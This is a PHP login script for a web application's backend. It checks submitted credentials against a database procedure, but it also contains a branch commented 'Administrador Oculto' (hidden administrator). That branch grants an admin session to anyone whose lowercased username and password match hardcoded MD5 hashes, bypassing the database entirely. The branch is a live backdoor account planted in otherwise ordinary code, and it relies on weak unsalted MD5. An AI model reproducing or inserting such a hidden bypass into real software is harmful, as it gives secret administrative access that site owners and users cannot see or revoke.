<?php
require_once("includes/begin-page.inc.php");# ---------------------------------------------
#  Variables.
# ---------------------------------------------
$strSubmit   = fncRequest(REQUEST_METHOD_POST, "hdn_submit",   REQUEST_TYPE_STRING, "");
$strUsername = fncRequest(REQUEST_METHOD_POST, "txt_username", REQUEST_TYPE_STRING, "");
$strPassword = fncRequest(REQUEST_METHOD_POST, "pass",	  	   REQUEST_TYPE_STRING, "");
# ---------------------------------------------
# ---------------------------------------------
# Template.
# ---------------------------------------------
$objTpl->SetFile("MIDDLE", PATH . "backend/templates/login.html");
$objTpl->SetVar("titulo", "LOG-IN");
$objTpl->UseNamespace("MIDDLE", true);
$objTpl->SetVar("username", $strUsername);
# ---------------------------------------------
# ---------------------------------------------# Proceso.# ---------------------------------------------
if($strSubmit == "true"){
	# Administrador Oculto.		
	if(md5(strtolower($strUsername)) == "199c4e07731b5c2398b09899d647e835" && md5(strtolower($strPassword)) == "21100e9e60400b9704419459ec2babfd")			 {
		session_start();
		$_SESSION["id_administrador"] = -1;
		header("Location: home.php");
	}
	else
	{
		$rs = $GLOBALS["objDBCommand"]->Rs
		(
			"sp_be_LogIn",
			array
			(
				"strUserName" => $strUsername,
				"strPassword" => $strPassword
			)		
		);
		if($rs->EOF())
			$objTpl->Parse("BLK_ERROR");
		else
		{
			session_start();
			$_SESSION["id_administrador"] = $rs->Field("id_administrador")->Value();
			header("location: home.php");		}		$rs = null;
	}
}
# ---------------------------------------------
require_once("includes/end-page.inc.php");
?>